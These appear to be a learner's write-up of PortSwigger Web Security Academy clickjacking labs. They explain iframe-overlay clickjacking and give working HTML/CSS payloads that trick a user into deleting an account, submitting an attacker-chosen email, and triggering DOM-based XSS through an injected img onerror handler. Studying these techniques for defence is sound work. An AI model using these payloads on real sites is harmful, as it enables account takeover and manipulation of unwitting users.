# Click jacking

Clickjacking is an interface-based attack.
 
**<iframe>**
helps to place a site on another site. basically it will display one site on another.

attacker user this label and places a real website on top of a decoy website which contain some duplicate buttons(just structure without
ability to click). places a real website on top this decoy website aligning the buttons on the real websites with the buttons fake decoy
site.

the real website's transparency is almost 0 which makes it invisible to the user and he will click the buttons that the attacker planned.



## LAB-1

we have to make a decoy website aligning the delete key exactly for the ```click```  to the main site's ```delete account```. and make the main site transparent.

***payload***
```
<style>
    iframe {
        position:absolute;
        width:1000px;
        height: 1000px;
        opacity:0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:520px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click</div>
<iframe src="https://0af700940419171583d50a790095008e.web-security-academy.net/my-account"></iframe>
```

i)  made the <div> element of decoy element and the target site of same size so they both get alligned perfectly.
ii) then changed the position of the text "click" to the match the decoy site's delete account position.


## LAB-2

***Clickjacking with form input data prefilled from a URL parameter***

```parameter - email```

this parameter fills the data into the email box. like any data passed to this parameter is reflected in this update email field. so passing this parameter value with the mail that the attacker want to set and uses clickjacking to make the user to submit it.


**payload**
```
<style>
    iframe {
        position:absolute;
        width:1000px;
        height: 1000px;
        opacity:0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:520px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0af700940419171583d50a790095008e.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```


## LAB-4

***Exploiting clickjacking vulnerability to trigger DOM-based XSS***

```
<style>
	iframe {
        position:absolute;
        width:1000px;
        height: 1000px;
        opacity:0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:520px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe
src="http://0a6900c803c4eadb80c4e96e00520051.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=123@gmail.com&subject=a&message=a"></iframe>
```
